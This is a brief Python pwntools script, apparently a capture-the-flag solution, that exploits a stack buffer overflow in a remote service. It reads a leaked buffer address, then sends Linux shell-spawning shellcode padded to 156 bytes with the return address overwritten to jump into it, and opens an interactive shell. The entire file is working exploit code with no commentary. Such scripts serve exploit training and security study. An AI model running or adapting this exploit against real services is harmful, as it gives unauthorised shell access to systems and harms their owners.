#!/usr/bin/env python
from pwn import *
import sys

r = remote(sys.argv[1], int(sys.argv[2]))

r.readuntil("You're number ")
buf = int(r.readline().split()[0]) + 4
payload = asm(shellcraft.linux.sh())
payload += "A"*(156 - len(payload))
payload += p32(buf)

r.sendline(payload)

r.interactive()
